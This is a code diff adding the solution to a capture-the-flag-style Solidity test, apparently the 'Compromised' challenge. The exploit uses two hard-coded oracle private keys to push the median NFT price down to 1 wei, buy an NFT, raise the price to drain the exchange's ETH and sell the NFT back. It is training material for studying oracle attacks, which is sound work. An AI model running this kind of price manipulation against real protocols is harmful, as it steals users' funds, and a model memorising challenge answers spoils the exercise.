@@ -75,7 +75,49 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        // Decode private keys from hex strings
+        address source1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address source2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+        // Verify we have control of two trusted sources
+        assertEq(source1, sources[0]);
+        assertEq(source2, sources[1]);
+
+        // Get initial median price
+        uint256 initialPrice = oracle.getMedianPrice("DVNFT");
         
+        // Set both controlled sources to very low price (will become median)
+        uint256 buyPrice = 1 wei;
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", buyPrice);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", buyPrice);
+
+        // Buy NFT at low median price as player
+        vm.startPrank(player);
+        uint256 id = exchange.buyOne{value: oracle.getMedianPrice("DVNFT")}();
+
+        // Set high price using compromised sources
+        vm.stopPrank();
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        // Approve exchange to transfer NFT and sell at high price
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+
+        // Send all profits to recovery address
+        payable(recovery).transfer(address(player).balance);
+        vm.stopPrank();
+
+        // Reset oracle price to original
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
     }
 
     /**
